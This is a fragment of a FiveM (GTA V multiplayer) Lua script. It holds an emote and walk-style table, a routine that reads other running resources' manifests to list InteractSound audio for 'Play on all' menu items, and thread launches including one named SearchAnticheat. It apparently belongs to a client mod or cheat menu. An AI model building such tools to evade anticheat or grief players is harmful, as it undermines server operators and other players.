    ["Bullet in the head"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_suicide",
        ["Anim"] = "pistol",
        ["Flag"] = 0,
    },
    ["Flex muscles"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_muscle_flex@arms_at_side@base",
        ["Anim"] = "base",
        ["Flag"] = 0,
    },
    ["Lift weights"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_muscle_free_weights@male@barbell@base",
        ["Anim"] = "base",
        ["Flag"] = 0,
    },
    ["Do push ups"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_push_ups@male@base",
        ["Anim"] = "base",
        ["Flag"] = 0,
    },
    ["Do sit ups"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_sit_ups@male@base",
        ["Anim"] = "base",
        ["Flag"] = 0,
    },
    ["Do yoga"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_yoga@male@base",
        ["Anim"] = "base_a",
        ["Flag"] = 0,
    },
    ["Drink coffee"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_aa_coffee@idle_a",
        ["Anim"] = "idle_a",
        ["Flag"] = 0,
    },
    ["Sit"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@heists@prison_heistunfinished_biztarget_idle",
        ["Anim"] = "target_idle",
        ["Flag"] = 0,
    },
    ["Lean against wall"] = {
        ["Type"] = "scenario",
        ["Anim"] = "world_human_leaning",
    },
    ["Sunbathe Back"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_SUNBATHE_BACK",
    },
    ["Sunbathe Front"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_SUNBATHE",
    },
    ["Clean"] = {
        ["Type"] = "scenario",
        ["Anim"] = "world_human_maid_clean",
    },
    ["BBQ"] = {
        ["Type"] = "scenario",
        ["Anim"] = "PROP_HUMAN_BBQ",
    },
    ["Search"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@prostitutes@sexlow_veh",
        ["Anim"] = "low_car_bj_to_prop_female",
        ["Flag"] = 0,
    },
    ["Take selfie"] = {
        ["Type"] = "scenario",
        ["Anim"] = "world_human_tourist_mobile",
    },
    ["Listen to wall/door"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@safe_cracking",
        ["Anim"] = "idle_base",
        ["Flag"] = 0,
    },
    ["Normal M"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@confident",
    },
    ["Normal F"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_f@heels@c",
    },
    ["Depressed male"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@depressed@a",
    },
    ["Depressed female"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_f@depressed@a",
    },
    ["Business"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@business@a",
    },
    ["Determined"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@brave@a",
    },
    ["Casual"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@casual@a",
    },
    ["Ate too much"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@fat@a",
    },
    ["Hipster"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@hipster@a",
    },
    ["Injured"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@injured",
    },
    ["In a hurry"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@hurry@a",
    },
    ["Hobo"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@hobo@a",
    },
    ["sad"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@sad@a",
    },
    ["Muscle"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@muscle@a",
    },
    ["Shocked"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@shocked@a",
    },
    ["Being shady"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@shadyped@a",
    },
    ["Buzzed"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@buzzed",
    },
    ["Hurry"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@hurry_butch@a",
    },
    ["Proud"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@money",
    },
    ["Short race"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@quick",
    },
    ["Man eater"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_f@maneater",
    },
    ["Sassy"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_f@sassy",
    },
    ["Arrogant"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_f@arrogant@a",
    },
    ["Man receiving in car"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@towing",
        ["Anim"] = "m_blow_job_loop",
        ["Flag"] = 0,
    },
    ["Woman giving in car"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@towing",
        ["Anim"] = "f_blow_job_loop",
        ["Flag"] = 0,
    },
    ["Man on bottom in car"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@prostitutes@sexlow_veh",
        ["Anim"] = "low_car_sex_loop_player",
        ["Flag"] = 0,
    },
    ["Woman on top in car"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@prostitutes@sexlow_veh",
        ["Anim"] = "low_car_sex_loop_female",
        ["Flag"] = 0,
    },
    ["Scratch nuts"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_player_int_uppergrab_crotch",
        ["Anim"] = "mp_player_int_grab_crotch",
        ["Flag"] = 0,
    },
    ["Hooker 1"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@strip_club@idles@stripper",
        ["Anim"] = "stripper_idle_02",
        ["Flag"] = 0,
    },
    ["Hooker 2"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS",
    },
    ["Hooker 3"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@strip_club@backroom@",
        ["Anim"] = "stripper_b_backroom_idle_b",
        ["Flag"] = 0,
    },
    ["Strip Tease 1"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@strip_club@lap_dance@ld_girl_a_song_a_p1",
        ["Anim"] = "ld_girl_a_song_a_p1_f",
        ["Flag"] = 0,
    },
    ["Strip Tease 2"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@strip_club@private_dance@part2",
        ["Anim"] = "priv_dance_p2",
        ["Flag"] = 0,
    },
    ["Stip Tease On Knees"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@strip_club@private_dance@part3",
        ["Anim"] = "priv_dance_p3",
        ["Flag"] = 0,
    },
}

CreateThread(function()
    interactsoundaudios = {}
    local files = {
        '__resource.lua',
        'fxmanifest.lua',
    }  

    local findLast = function(haystack, needle)
        local i = haystack:match(".*" .. needle .. "()")
        if i == nil then 
            return nil 
        else 
            return i - 1 
        end
    end

    for i = 0, GetNumResources() - 1 do
        if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
            for k, v in pairs(files) do
                local text = LoadResourceFile(GetResourceByFindIndex(i), v)
                if text then
                    if string.find((text):lower(), ('InteractSound by Scott'):lower(), 1, true) then
                        for str in text:gmatch("[^\r\n]+") do
                            local s, e = str:find('.ogg')
                            if s and e then
                                if not str:find('--', 1, true) then
                                    text = str:sub(findLast(str, '/'), s)
                                    print('Found interactsound: ^1'.. text:sub(2, #text - 1))
                                    table.insert(interactsoundaudios, text:sub(2, #text - 1))
                                    HasInteractSound = true
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    -- for k, v in pairs(files) do
    --     local text = LoadResourceFile(v[1], v[2])
    --     if text then
    --         for str in text:gmatch("[^\r\n]+") do
    --             local s, e = str:find('.ogg')
    --             if s and e then
    --                 if not str:find('--', 1, true) then
    --                     text = str:sub(findLast(str, '/'), s)
    --                     print('Found interactsound: ^1'.. text:sub(2, #text - 1))
    --                     table.insert(interactsoundaudios, text:sub(2, #text - 1))
    --                     HasInteractSound = true
    --                 end
    --             end
    --         end
    --     end
    -- end

    if #interactsoundaudios == 0 then
        interactsoundaudios = {'no sounds'}
    else
        for k, v in pairs(Objects) do
            for k, v in pairs(v) do
                if v['Text'] == 'Play on all' or v['Text'] == 'Play sound on player' then
                    v['Items'] = interactsoundaudios
                end
            end
        end
    end
end)

CreateThread(VehicleInitialize)
CreateThread(Menu)
CreateThread(Loaded)
CreateThread(ESXCode)
CreateThread(SearchAnticheat)
CreateThread(PlayerUpdate)
CreateThread(AutoDrive)
CreateThread(WeatherThread)
CreateThread(BlipsThread)
CreateThread(WeaponThread)
CreateThread(TogglesThread)